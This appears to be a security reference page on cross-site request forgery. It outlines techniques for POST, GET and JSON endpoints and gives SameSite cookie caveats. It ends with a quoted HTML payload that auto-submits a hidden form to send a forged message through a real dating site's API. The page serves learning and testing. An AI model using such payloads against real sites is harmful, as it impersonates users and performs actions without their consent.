---
description: Making a request on the user's behalf.
---

# Cross Site Request Forgery \(CSRF\)

## Overview

If a website automatically sends a user's credentials when you interact with it \(cookies are sent automatically\), then CSRF can be used to impersonate the user \(assuming the website doesn't do anything to prevent it\).

## Common CSRF Payloads

Different types of endpoints require different techniques:

* POST
* GET
* DELETE/UPDATE
* JSON endpoint
* XML endpoint

### POST

Make a POST form with hidden inputs and use JavaScript to send the POST request automatically when the user navigates to the page.

### GET

Make an image with zero width and length and `src=`t`he_csrf_Link`. The GET request is made automatically when the browser tries to load the image.

### PUT/DELETE

This one is very difficult. Can only be accomplished with like browser plugins/plugin vulns and stuff.

### JSON

You can try to do a CSRF request to a JSON API endpoint.

https://blog.azuki.vip/csrf/



**Caveats** \(as of august 2021\):

* The server must not require **content-type: application/json** in the headers. The method results in a request with a **content-type: text/plain**  header
* This method results in one of the fields in the JSON request being `"foo":"="`. In other words, the server must not deny the request because of an **unexpected field**, or an **expected field with the value** `=`
* The SameSite cookie attribute must not be Strict
  * It defaults to **Lax** on browsers
  * In Firefox, it always works when SameSite has not been set
    * Haven’t tested when SameSite has been explicitly set to Lax
  * In Chrome, it works when SameSite has not been set
    * But only for **two minutes**, starting from the time the cookie was assigned to the user
    * Probably won’t work if SameSite has been explicitly set to Lax





Sample payload from the article. Sends a JSON request to the okcupid API:

```text
<html>  
 <body>  
   <form id="form" method="post" action="https://www.okcupid.com/1/apitun/messages/send" enctype="text/plain"\>  
     <input style='display:none' name='{"foo":"' value='", "receiverid":"123", "body":"i am a rabbit", "source":"desktop\_global", "service":"other"}'\>  
     <input type="submit" value="Click me"\>  
   </form>  
   <script>  
     window.onload = () => {form.submit()}  
   </script>  
 </body>  
</html>
```

